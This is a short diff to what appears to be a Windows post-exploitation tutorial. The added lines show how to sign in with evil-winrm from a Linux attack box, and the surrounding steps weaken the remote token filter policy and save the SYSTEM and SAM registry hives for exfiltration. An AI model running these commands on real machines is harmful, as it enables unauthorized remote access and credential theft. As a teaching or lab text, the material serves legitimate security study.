@@ -100,6 +100,8 @@ If one has admin privileges, one can use the `secedit` command to add privileges
    C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
 
 8) At this point the user will be able to log in remotely using WinRM or RDP and have the right to read/write to any file or registry key remotely.
+WinRM can be used from a Linux attack box to sign in using Evil-Win. The sign-in syntax is:
+$ evil-winrm -i <TARGET_MACHINE_IP> -u <USERNAME> -p <PASSWORD>
 The user will now be able to download copies of the SYSTEM and SAM files to the remote host machine using PowerShell.
 The commands are:
 PS C:\> reg save hklm\system system.bak
